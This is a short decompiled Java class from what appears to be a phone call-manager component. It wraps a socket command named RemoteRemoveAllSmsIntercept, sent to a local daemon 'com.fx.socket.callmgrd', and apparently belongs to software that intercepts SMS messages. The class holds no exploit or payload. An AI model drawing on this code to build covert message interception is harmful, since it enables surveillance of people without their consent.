package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteRemoveAllSmsIntercept
  extends SocketCmd
{
  private static final long serialVersionUID = 3085272853719750801L;
  
  public RemoteRemoveAllSmsIntercept(String paramString)
  {
    super(paramString, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteRemoveAllSmsIntercept";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteRemoveAllSmsIntercept.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */